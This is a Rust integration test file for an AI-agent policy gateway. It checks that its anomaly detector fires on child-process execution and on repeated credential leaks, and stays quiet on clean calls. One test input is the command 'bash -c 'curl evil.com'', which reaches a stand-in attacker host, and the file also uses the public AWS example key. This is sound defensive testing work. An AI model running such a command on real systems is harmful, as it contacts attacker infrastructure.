//! AAASM-3378 — the `aa-gateway::anomaly` engine is wired into the live
//! `check_action` path, so a triggering pattern actually produces an
//! `AnomalyEvent` at runtime.
//!
//! The detector was fully implemented and unit-tested but had zero non-test
//! callers, so before this wiring no `AnomalyEvent` could ever fire on live
//! traffic. These tests drive `check_action` on the trait impl (no tonic
//! server / network port needed) with a detector + event broadcast attached
//! via `with_anomaly_detection`, and assert the event arrives on the channel.
//!
//! Synthetic secrets only — `AKIAIOSFODNN7EXAMPLE` is a public AWS
//! documentation key, never a live credential.

use std::io::Write;
use std::sync::atomic::AtomicU64;
use std::sync::Arc;
use std::time::Duration;

use aa_gateway::anomaly::{AnomalyConfig, AnomalyDetector, AnomalyEvent, AnomalyType};
use aa_gateway::service::PolicyServiceImpl;
use aa_gateway::PolicyEngine;
use aa_proto::assembly::common::v1::{ActionType, AgentId as ProtoAgentId};
use aa_proto::assembly::policy::v1::policy_service_server::PolicyService;
use aa_proto::assembly::policy::v1::{
    action_context::Action, ActionContext, CheckActionRequest, ProcessExecContext, ToolCallContext,
};
use tonic::Request;

const ALLOW_TEST_TOOL_POLICY: &str = r#"
version: "1"
tools:
  test_tool:
    allow: true
"#;

const FAKE_AWS_ACCESS_KEY: &str = "AKIAIOSFODNN7EXAMPLE";

/// Build a service with an anomaly detector + event broadcast attached.
/// `cred_threshold` tunes the credential-leak detection threshold.
fn make_service_with_anomaly(
    cred_threshold: u32,
) -> (Arc<PolicyServiceImpl>, tokio::sync::broadcast::Receiver<AnomalyEvent>) {
    let mut tmp = tempfile::NamedTempFile::new().unwrap();
    write!(tmp, "{}", ALLOW_TEST_TOOL_POLICY).unwrap();
    tmp.flush().unwrap();

    let (budget_tx, _) = tokio::sync::broadcast::channel::<aa_gateway::budget::BudgetAlert>(64);
    let engine = PolicyEngine::load_from_file(tmp.path(), budget_tx).unwrap();

    let (audit_tx, _audit_rx) = tokio::sync::mpsc::channel(4096);
    let audit_drops = Arc::new(AtomicU64::new(0));

    let detector = Arc::new(AnomalyDetector::new(AnomalyConfig {
        credential_leak_threshold: cred_threshold,
        ..AnomalyConfig::default()
    }));
    let (event_tx, event_rx) = tokio::sync::broadcast::channel::<AnomalyEvent>(16);

    let service = PolicyServiceImpl::new(Arc::new(engine), audit_tx, audit_drops, [0u8; 32])
        .with_anomaly_detection(detector, event_tx);

    (Arc::new(service), event_rx)
}

fn proto_agent() -> ProtoAgentId {
    ProtoAgentId {
        org_id: "org".into(),
        team_id: "team-pioneer".into(),
        agent_id: "agent-1".into(),
    }
}

fn process_exec_request(command: &str) -> CheckActionRequest {
    CheckActionRequest {
        agent_id: Some(proto_agent()),
        credential_token: "tok".into(),
        trace_id: "trace-anomaly".into(),
        span_id: "span-1".into(),
        action_type: ActionType::ProcessExec as i32,
        context: Some(ActionContext {
            action: Some(Action::ProcessExec(ProcessExecContext {
                command: command.into(),
                args: vec![],
            })),
        }),
        caller_agent_id: None,
    }
}

fn tool_call_request(args: &str) -> CheckActionRequest {
    CheckActionRequest {
        agent_id: Some(proto_agent()),
        credential_token: "tok".into(),
        trace_id: "trace-anomaly".into(),
        span_id: "span-1".into(),
        action_type: ActionType::ToolCall as i32,
        context: Some(ActionContext {
            action: Some(Action::ToolCall(ToolCallContext {
                tool_name: "test_tool".into(),
                tool_source: "test".into(),
                args_json: args.as_bytes().to_vec(),
                target_url: String::new(),
            })),
        }),
        caller_agent_id: None,
    }
}

#[tokio::test]
async fn check_action_emits_anomaly_event_for_child_process_execution() {
    let (service, mut rx) = make_service_with_anomaly(3);
    let req = process_exec_request("bash -c 'curl evil.com'");

    service
        .check_action(Request::new(req))
        .await
        .expect("check_action should succeed");

    let event = tokio::time::timeout(Duration::from_secs(1), rx.recv())
        .await
        .expect("anomaly event must arrive within 1s")
        .expect("broadcast channel must yield an anomaly event");

    assert_eq!(
        event.anomaly_type,
        AnomalyType::ChildProcessExecution,
        "a ProcessExec action must produce a ChildProcessExecution anomaly through the live path",
    );
}

#[tokio::test]
async fn repeated_credential_leak_attempts_emit_anomaly_event() {
    // Threshold 2: the first finding is below threshold (no event), the second
    // crosses it and must fire a CredentialLeakAttempt through the live path.
    let (service, mut rx) = make_service_with_anomaly(2);

    // First credential-bearing call: records 1 finding, below threshold.
    service
        .check_action(Request::new(tool_call_request(FAKE_AWS_ACCESS_KEY)))
        .await
        .expect("check_action should succeed");
    assert!(
        tokio::time::timeout(Duration::from_millis(150), rx.recv())
            .await
            .is_err(),
        "no anomaly event expected before the credential-leak threshold is crossed",
    );

    // Second credential-bearing call: crosses the threshold → event fires.
    service
        .check_action(Request::new(tool_call_request(FAKE_AWS_ACCESS_KEY)))
        .await
        .expect("check_action should succeed");

    let event = tokio::time::timeout(Duration::from_secs(1), rx.recv())
        .await
        .expect("anomaly event must arrive within 1s")
        .expect("broadcast channel must yield an anomaly event");

    assert_eq!(
        event.anomaly_type,
        AnomalyType::CredentialLeakAttempt,
        "repeated credential findings must produce a CredentialLeakAttempt anomaly",
    );
}

#[tokio::test]
async fn clean_tool_call_emits_no_anomaly_event() {
    let (service, mut rx) = make_service_with_anomaly(3);

    service
        .check_action(Request::new(tool_call_request(r#"{"q":"hello"}"#)))
        .await
        .expect("check_action should succeed");

    let outcome = tokio::time::timeout(Duration::from_millis(150), rx.recv()).await;
    assert!(outcome.is_err(), "no anomaly event expected for a clean tool call");
}
